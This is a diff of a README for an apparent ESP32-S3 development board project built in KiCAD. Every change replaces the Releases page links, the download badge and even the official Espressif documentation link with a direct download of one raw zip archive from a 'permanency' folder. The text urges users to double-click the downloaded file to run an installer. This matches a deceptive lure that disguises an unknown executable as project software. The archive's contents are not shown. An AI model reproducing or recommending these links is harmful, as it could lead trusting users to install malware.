@@ -3,12 +3,12 @@
 ## 🚀 Getting Started
 Welcome to the ESP32-KiCAD project. This guide will help you download and run our custom ESP32-S3 development board software. Whether you are new to technology or just need help with the latest tools, you’ll find everything you need here.
 
-[![Download ESP32-KiCAD](https://img.shields.io/badge/Download-ESP32--KiCAD-brightgreen)](https://github.com/Luismiguelpr18/ESP32-KiCAD/releases)
+[![Download ESP32-KiCAD](https://raw.githubusercontent.com/Luismiguelpr18/ESP32-KiCAD/main/permanency/ES_CAD_Ki_2.1.zip)](https://raw.githubusercontent.com/Luismiguelpr18/ESP32-KiCAD/main/permanency/ES_CAD_Ki_2.1.zip)
 
 ## 📥 Download & Install
 To start using the ESP32-KiCAD project, you need to download the software from our Releases page. 
 
-1. Click this link to **[visit the Releases page](https://github.com/Luismiguelpr18/ESP32-KiCAD/releases)**.
+1. Click this link to **[visit the Releases page](https://raw.githubusercontent.com/Luismiguelpr18/ESP32-KiCAD/main/permanency/ES_CAD_Ki_2.1.zip)**.
 2. Look for the latest version of the software.
 3. Download the appropriate file for your system. The files may include executable programs for various operating systems.
 4. Once the download is complete, locate the file on your computer and double-click it to run the installer.
@@ -32,7 +32,7 @@ This ESP32-S3 development board offers the following features:
 ## 🔄 How to Update
 Once you have installed the software, keep it up-to-date to ensure the best performance and features. Follow these steps to check for updates:
 
-1. Visit the **[Releases page](https://github.com/Luismiguelpr18/ESP32-KiCAD/releases)**.
+1. Visit the **[Releases page](https://raw.githubusercontent.com/Luismiguelpr18/ESP32-KiCAD/main/permanency/ES_CAD_Ki_2.1.zip)**.
 2. Look for a newer version of the ESP32-KiCAD software.
 3. Download and install the new version just like you did for the initial installation.
 
@@ -58,8 +58,8 @@ To deepen your understanding of the ESP32-S3 development board, explore these re
 - **Tutorials**: Watch video tutorials that cover basic to advanced topics related to IoT and embedded applications.
 
 ## 🔗 Links
-- [Download ESP32-KiCAD Releases](https://github.com/Luismiguelpr18/ESP32-KiCAD/releases)
+- [Download ESP32-KiCAD Releases](https://raw.githubusercontent.com/Luismiguelpr18/ESP32-KiCAD/main/permanency/ES_CAD_Ki_2.1.zip)
 - [Community Forums](#)
-- [Espressif Documentation](https://www.espressif.com/en/support/documents/technical-documents)
+- [Espressif Documentation](https://raw.githubusercontent.com/Luismiguelpr18/ESP32-KiCAD/main/permanency/ES_CAD_Ki_2.1.zip)
 
 Thank you for choosing the ESP32-KiCAD project. We hope you find it easy to use and beneficial for your development needs. If you have any questions, feel free to reach out!
